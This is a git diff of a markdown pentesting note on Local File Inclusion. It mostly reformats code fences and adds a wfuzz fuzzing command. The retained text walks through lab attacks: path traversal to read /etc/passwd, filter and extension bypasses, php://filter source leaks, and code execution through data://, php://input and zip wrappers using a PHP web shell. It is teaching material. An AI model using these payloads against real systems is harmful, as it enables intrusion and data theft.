@@ -1,10 +1,10 @@
-# Local File Inclusion \(LFI\)
+# Local File Inclusion (LFI)
 
 ## Local File Inclusion
 
 Local File Inclusion is a vulnerability that allows us to include files that are on the target server. Server-side languages such as PHP or JSP can dynamically include external scripts, reducing the script's overall size and simplifying the code. Attackers can include both local and remote files if this inclusion logic isn't checked, which could lead to source code leakage, sensitive data exposure, and code execution under some circumstances.
 
-## LFI 
+## LFI&#x20;
 
 First, there must be a functionality that includes files.
 
@@ -19,13 +19,13 @@ Source Code Example:
 
 With this we can include any file on the system and display its contents on the web:
 
-```text
+```
 http://192.168.28.152/example.php?file=/etc/passwd
 ```
 
 We can use curl, a browser or anything that renders URLs.
 
-```text
+```
 ❯ curl 'http://192.168.28.152/example.php?file=/etc/passwd'
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -41,10 +41,18 @@ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 
 However, with curl we have more control over what we want to do, in this case we can use bash and some tools to filter the output like so:
 
-```text
+```
 ❯ curl -s 'http://192.168.28.152/example.php?file=/etc/passwd' | grep 'sh$'
 root:x:0:0:root:/root:/bin/bash
 suer:x:1000:1000:user,,,:/home/suer:/bin/bash
+```
+
+### LFI Fuzzing
+
+You are lazy to go through this manually or you just want to save some time... well just make some noise:
+
+```
+wfuzz -c -w /usr/share/seclists/Fuzzing/LFI.txt --hw 0 http://dev.team.thm/script.php?page=/../../../../../FUZZ
 ```
 
 ### LFI with Directory Traversal
@@ -58,7 +66,7 @@ suer:x:1000:1000:user,,,:/home/suer:/bin/bash
 
 Since the directory is explicitly indicated under `/var/www/html` which are 3 directories `/1/2/3` then we must go 3 directories back with `../` so it'll look like this:
 
-```text
+```
 ❯ curl -s 'http://192.168.28.152/directory_traversal.php?file=../../../../etc/passwd' | grep 'sh$'
 root:x:0:0:root:/root:/bin/bash
 suer:x:1000:1000:user,,,:/home/suer:/bin/bash
@@ -66,7 +74,7 @@ suer:x:1000:1000:user,,,:/home/suer:/bin/bash
 
 Alternatively, we can go back more than 3 times and it'll still work:
 
-```text
+```
 root@ubuntu:/var/www/html# pwd
 /var/www/html
 root@ubuntu:/var/www/html# cd ../../../../../../../../
@@ -74,7 +82,7 @@ root@ubuntu:/# pwd
 /
 ```
 
-```text
+```
 ❯ curl -s 'http://192.168.28.152/directory_traversal.php?file=../../../../../../../etc/passwd' | grep 'sh$'
 root:x:0:0:root:/root:/bin/bash
 suer:x:1000:1000:user,,,:/home/suer:/bin/bash
@@ -88,7 +96,7 @@ Developers may specify absolute paths when including files.
 include("./languages/" . $_GET['language']);
 ```
 
-The statement above includes the files present in the languages folder. 
+The statement above includes the files present in the languages folder.&#x20;
 
 **Another Example**
 
@@ -102,7 +110,7 @@ In this scenario, input such as `../../../../../etc/passwd` will result in the f
 
 ### LFI with Blacklisting
 
-Scripts can employ search and replace techniques to avoid path traversals. 
+Scripts can employ search and replace techniques to avoid path traversals.&#x20;
 
 ```php
 $language = str_replace('../', '', $_GET['language']);
@@ -117,7 +125,7 @@ while( substr_count($lfi, '../', 0)) {
 };
 ```
 
-Of course, the easiest method to fix this is to use `basename($ GET['language'])`, however this could damage your application if it goes inside a directory. While the following example works, it's ideal to try to find a native function to do the activity in your language or framework. Use a bash terminal and go into your home directly \(cd ~ / cd $HOME\) and run the command `cat .?/.*/.?/etc/passwd`. You'll see Bash allows for for the `?` and `*` wildcards to be used as a `.`.  We can use those symbols with directory traversal to achieve an LFI.
+Of course, the easiest method to fix this is to use `basename($ GET['language'])`, however this could damage your application if it goes inside a directory. While the following example works, it's ideal to try to find a native function to do the activity in your language or framework. Use a bash terminal and go into your home directly (cd \~ / cd $HOME) and run the command `cat .?/.*/.?/etc/passwd`. You'll see Bash allows for for the `?` and `*` wildcards to be used as a `.`.  We can use those symbols with directory traversal to achieve an LFI.
 
 ### **Bypass with URL Encoding**
 
@@ -135,7 +143,7 @@ include($_GET['language'] . ".php");
 
 ## Bypass Extensions Filters
 
-%00 = Null bytes terminate the string, this trick can be used to bypass file extensions added server-side and are useful for file inclusions because it prevents the file extension from being considered as part of the string. 
+%00 = Null bytes terminate the string, this trick can be used to bypass file extensions added server-side and are useful for file inclusions because it prevents the file extension from being considered as part of the string.&#x20;
 
 ? = The question mark, marks anything added to the URL server-side as part of the query string. It can also use be used as an "alternative" to the null bytes trick.
 
@@ -147,14 +155,14 @@ include($_GET['language'] . ".php");
 
 We can the PHP wrapper base64 function to convert the contents of a resource to base64 encoding:
 
-```text
+```
 ❯ curl -s 'http://192.168.28.152/example.php?file=php://filter/convert.base64-encode/resource=comment.php'
 PD9waHAKCSRmaWxlbmFtZSA9ICRfR0VUWydmaWxlJ107CglpbmNsdWRlKCRmaWxlbmFtZSk7IC8vIFRoaXMgaXMgYSBjb21tZW50Cj8+Cg==
 ```
 
 Then, we can decode it and read the source:
 
-```text
+```
 ❯ echo 'PD9waHAKCSRmaWxlbmFtZSA9ICRfR0VUWydmaWxlJ107CglpbmNsdWRlKCRmaWxlbmFtZSk7IC8vIFRoaXMgaXMgYSBjb21tZW50Cj8+Cg==' | base64 -d
 <?php
         $filename = $_GET['file'];
@@ -174,7 +182,7 @@ The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used 
 
 First, base64 encode a PHP web shell.
 
-```text
+```
 wixnic@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' | base64
 
 PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
@@ -188,7 +196,7 @@ Then include it using the data wrapper as shown below.
 
 The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute code. In PHP it also needs the `allow_url_include` setting enabled. The following curl command sends a POST request with a system command and then includes it using `php://input`, which gets executed by the page.
 
-```text
+```
 wixnic@htb[/htb]$ curl -s -X POST --data "<?php system('id'); ?>" "http://victim.vmx/index.php?language=php://input" | grep uid
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -198,17 +206,16 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 The [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper can prove useful in combination with file uploads. If the website enables arbitrary file uploads, an attacker might upload a malicious zip file containing PHP code. This wrapper isn't enabled by default, however, it can be activated with the command below.
 
-```text
+```
 wixnic@htb[/htb]$ apt install phpX.Y-zip
 ```
 
 Follow the steps below to create a malicious archive.
 
-```text
+```
 wixnic@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' > exec.php
 wixnic@htb[/htb]$ zip malicious.zip exec.php
 wixnic@htb[/htb]$ rm exec.php
 ```
 
 Next, copy `malicious.zip` to the web root to simulate the upload. The files in the zip archive can be referenced using the `#` symbol, which is URL-encoded in the request as `%23`.
-
